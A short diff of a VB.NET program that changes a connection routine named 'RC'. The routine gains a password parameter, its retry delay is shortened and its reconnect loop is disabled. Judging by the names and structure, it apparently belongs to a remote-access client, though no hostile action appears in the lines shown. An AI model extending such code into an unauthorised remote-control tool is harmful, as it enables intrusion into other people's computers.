@@ -14,10 +14,10 @@ Public Class Main
     Public Shared BL As Boolean = False
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal PW As String)
 
 re:
-        Sleep(120000)
+        Sleep(30000)
 
         Try
             If Not File.Exists(Windows.Forms.Application.StartupPath + "\IconLib.dll") AndAlso Not File.Exists(Windows.Forms.Application.StartupPath + "\Interop.Shell32.dll") Then
@@ -51,7 +51,7 @@ re:
 
                 End If
             Next
-            GoTo re
+            'GoTo re
         Catch ex As Exception
             Console.WriteLine("RC " + ex.Message)
         End Try
